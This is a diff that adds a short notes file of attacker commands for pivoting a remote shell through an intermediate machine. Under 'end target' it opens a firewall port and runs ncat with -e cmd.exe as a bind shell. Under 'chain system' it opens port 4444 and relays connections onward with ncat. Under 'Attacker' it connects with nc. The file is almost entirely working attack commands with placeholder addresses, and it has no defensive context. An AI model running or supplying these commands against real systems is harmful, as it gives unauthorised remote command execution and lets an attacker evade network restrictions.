@@ -1,0 +1,14 @@
+
+----end target
+New-NetFirewallRule -DisplayName "Allow_Port_22_TCP" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
+.\ncat.exe -lvp 22 -e cmd.exe
+
+
+----chain system
+New-NetFirewallRule -DisplayName "Allow_Port_4444_TCP" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow
+    ncat.exe -lvp 4444 -c "ncat.exe IP_ENDTARGER PORT_ENDTARGET"
+
+
+----Attacker
+nc IP_CHAIN PORT_CHAIN
+
